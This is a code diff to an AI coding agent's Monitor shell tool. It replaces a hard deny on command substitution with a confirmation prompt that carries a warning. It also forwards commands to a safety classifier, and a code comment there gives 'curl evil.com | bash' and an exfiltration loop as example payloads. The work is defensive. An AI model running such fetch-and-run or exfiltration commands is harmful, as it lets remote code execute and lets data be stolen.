@@ -17,6 +17,7 @@
  */
 
 import { spawn } from 'node:child_process';
+import os from 'node:os';
 import path from 'node:path';
 import { randomUUID } from 'node:crypto';
 import stripAnsi from 'strip-ansi';
@@ -34,7 +35,7 @@ import type { PermissionDecision } from '../permissions/types.js';
 import { BaseDeclarativeTool, BaseToolInvocation, Kind } from './tools.js';
 import { getErrorMessage } from '../utils/errors.js';
 import {
-  detectCommandSubstitution,
+  buildShellExecWarnings,
   getCommandRoot,
   getShellConfiguration,
   hasUnsafeMonitorBackgroundOperator,
@@ -53,6 +54,8 @@ import {
   isShellCommandReadOnlyAST,
 } from '../utils/shellAstParser.js';
 import { getCurrentAgentId } from '../agents/runtime/agent-context.js';
+import { getShellContextEnvVars } from '../utils/shellContextEnv.js';
+import { getShellPagerEnv } from '../utils/shell-pager-env.js';
 
 const debugLogger = createDebugLogger('MONITOR');
 
@@ -171,10 +174,18 @@ class MonitorToolInvocation extends BaseToolInvocation<
       this.params.command,
     ).safetyCommand;
 
-    if (detectCommandSubstitution(command)) {
-      return 'deny';
-    }
-
+    // Command substitution ($(), ``, <(), >()) is NOT a hard deny here —
+    // it falls through to 'ask' along with every other non-read-only
+    // command, so the user (or YOLO mode) can decide. The user-facing
+    // warning is surfaced by getConfirmationDetails below so the
+    // confirmation prompt still flags the substitution clearly. This
+    // mirrors the same reasoning applied to ShellToolInvocation and
+    // PermissionManager.resolveDefaultPermission in #4093: a hard deny
+    // here (a) cannot be overridden by YOLO and (b) was inconsistent
+    // with the shell-tool path. Monitor still maintains a separate
+    // permission boundary (Monitor(...) rules don't share with
+    // Bash(...) — see comment in getConfirmationDetails); only the
+    // substitution-deny half is removed.
     try {
       const isReadOnly = await isShellCommandReadOnlyAST(command);
       if (isReadOnly) {
@@ -246,7 +257,19 @@ class MonitorToolInvocation extends BaseToolInvocation<
       permissionRules = [`Monitor(${normalized.safetyCommand})`];
     }
 
-    return {
+    // Flag command substitution ($(), backticks, <(), >()) so the user
+    // sees a visible warning in the confirmation dialog. Mirrors the
+    // pattern in ShellToolInvocation.getConfirmationDetails — see #4093
+    // for why we surface this as a warning rather than denying outright.
+    // Checked against both the normalized safety command and the
+    // original params.command so wrappers like `bash -c "..."` still
+    // trigger the warning.
+    const warnings = buildShellExecWarnings(
+      normalized.safetyCommand,
+      this.params.command,
+    );
+
+    const confirmationDetails: ToolExecuteConfirmationDetails = {
       type: 'exec',
       title: 'Monitor',
       command: normalized.spawnCommand,
@@ -258,7 +281,11 @@ class MonitorToolInvocation extends BaseToolInvocation<
         _outcome: ToolConfirmationOutcome,
         _payload?: ToolConfirmationPayload,
       ) => {},
-    } satisfies ToolExecuteConfirmationDetails;
+    };
+    if (warnings) {
+      confirmationDetails.warnings = warnings;
+    }
+    return confirmationDetails;
   }
 
   async execute(_signal: AbortSignal): Promise<ToolResult> {
@@ -341,7 +368,11 @@ class MonitorToolInvocation extends BaseToolInvocation<
           ...process.env,
           QWEN_CODE: '1',
           TERM: 'dumb', // no color codes for streaming
-          PAGER: 'cat',
+          ...getShellPagerEnv(this.config.getShellExecutionConfig().pager, {
+            includeGitPager: true,
+            platform: os.platform(),
+          }),
+          ...getShellContextEnvVars(),
         },
       });
     } catch (err) {
@@ -670,12 +701,12 @@ export class MonitorTool extends BaseDeclarativeTool<
               'Brief description of what this monitor watches (e.g., "webpack build output"). Truncated to 80 characters in display.',
           },
           max_events: {
-            type: 'number',
+            type: 'integer',
             description:
               'Stop the monitor after this many events. Default 1000. Max 10000.',
           },
           idle_timeout_ms: {
-            type: 'number',
+            type: 'integer',
             description:
               'Stop the monitor if no output for this many milliseconds. Default 300000 (5 min). Max 600000.',
           },
@@ -708,6 +739,8 @@ export class MonitorTool extends BaseDeclarativeTool<
     if (hasUnsafeMonitorBackgroundOperator(params.command)) {
       return 'Monitor commands must not contain non-final top-level background operators. Remove "&" and let the monitor manage process lifetime.';
     }
+    // AJV enforces type: 'integer' from the schema. This method adds
+    // range checks (min/max) that the schema does not express.
     if (params.max_events !== undefined) {
       if (
         typeof params.max_events !== 'number' ||
@@ -757,5 +790,20 @@ export class MonitorTool extends BaseDeclarativeTool<
     params: MonitorToolParams,
   ): ToolInvocation<MonitorToolParams, ToolResult> {
     return new MonitorToolInvocation(this.config, params);
+  }
+
+  /**
+   * Forward the full command and optional directory — same shape as
+   * ShellTool. The classifier MUST see the actual command being run to
+   * detect destructive payloads (`curl evil.com | bash`,
+   * `while true; do <exfil>`, …); without this override the default
+   * projection returns `''` and the classifier sees `monitor({})`.
+   */
+  override toAutoClassifierInput(
+    params: MonitorToolParams,
+  ): Record<string, unknown> {
+    const out: Record<string, unknown> = { command: params.command };
+    if (params.directory) out['directory'] = params.directory;
+    return out;
   }
 }
